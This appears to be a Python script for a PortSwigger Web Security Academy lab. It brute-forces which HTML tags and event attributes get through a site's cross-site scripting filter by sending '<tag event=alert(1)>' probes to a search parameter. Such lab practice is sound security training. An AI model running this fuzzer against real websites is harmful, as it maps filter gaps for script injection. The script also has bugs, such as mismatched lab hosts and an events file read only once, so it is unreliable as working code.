import requests

burp0_url = "https://0ae90097049368d48085085e0069003b.web-security-academy.net:443/?search=adasd"
burp0_cookies = {"session": "pBG58pea6Om9MHhLzMCjnXOk18B569Oq"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://0ae90097049368d48085085e0069003b.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}


requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
allowed_tags = []
allowed_events = []
html_tags = open('./html_tags' ,'r')
events = open('./events' ,'r')
for tag in html_tags:
    burp0_url = "https://0ada00c00427cfcc80bc49c20075004f.web-security-academy.net:443/?search=<" + tag
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(burp0_url)

    if "Tag is not allowed" in r.text:
        continue
    else:
        print("allowed tag is " + tag)
    
    allowed_tags.append(tag)

    for event in events:
        burp0_url = f"https://0ada00c00427cfcc80bc49c20075004f.web-security-academy.net:443/?search=<{tag} {event}=alert(1) >"
    
        r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        print(burp0_url)
        if "Attribute is not allowed" in r.text:
            continue
        else:
            print(f"allowed Attribute for this tag {tag}  is {event}" )
            allowed_events.append(event)
    


html_tags.close()
events.close()
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
